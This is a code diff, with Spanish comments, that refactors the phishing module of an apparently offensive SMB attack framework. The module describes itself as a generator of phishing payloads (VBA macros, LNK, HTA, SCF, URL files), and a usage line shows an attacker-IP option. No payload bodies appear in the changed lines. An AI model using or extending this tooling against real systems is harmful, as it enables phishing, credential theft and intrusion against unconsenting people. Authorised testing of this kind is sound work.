@@ -19,6 +19,7 @@ Uso:
   python lobera.py smb --script=phishing --type url   --attacker-ip 10.10.10.99 --out-dir /tmp/payloads
 """
 
+from scripts.base import BaseScript
 from core.output import console
 from core import session_db
 
@@ -229,20 +230,18 @@ IDList=
 
 # ── Script principal ───────────────────────────────────────────────────────────
 
-class Script:
-    NAME        = "phishing"
-    DESCRIPTION = "Generador de payloads phishing: macro VBA, LNK, HTA, SCF, URL"
+class Script(BaseScript):
+    name        = "phishing"
+    protocol    = "smb"
+    category    = "attack"
+    description = "Generador de payloads phishing: macro VBA, LNK, HTA, SCF, URL"
 
-    def __init__(self, target, creds):
-        self.target = target
-        self.creds  = creds
-
-    def run(self, args):
-        ptype       = getattr(args, "phishing_type", None) or getattr(args, "type", None) or "macro"
-        payload     = getattr(args, "exec",          None)
-        out_dir     = getattr(args, "out_dir",       ".") or "."
-        doc_name    = getattr(args, "persist_name",  "documento") or "documento"
-        attacker_ip = getattr(args, "attacker_ip",   None)
+    def run(self, **kwargs):
+        ptype       = kwargs.get("phishing_type") or kwargs.get("type") or "macro"
+        payload     = kwargs.get("exec")
+        out_dir     = kwargs.get("out_dir", ".") or "."
+        doc_name    = kwargs.get("persist_name", "documento") or "documento"
+        attacker_ip = kwargs.get("attacker_ip")
 
         os.makedirs(out_dir, exist_ok=True)
 
@@ -280,12 +279,8 @@ class Script:
             return
 
         if out_path:
-            session_db.save_finding(
-                category="phishing",
-                data={
-                    "type":    ptype,
-                    "payload": payload or attacker_ip,
-                    "file":    out_path,
-                }
+            session_db.DB.SaveFinding(
+                str(self.target.ip), "SMB", "phishing",
+                f"type={ptype} file={out_path}"
             )
             console.print(f"\n  [bold green]✓ Payload generado[/bold green]")
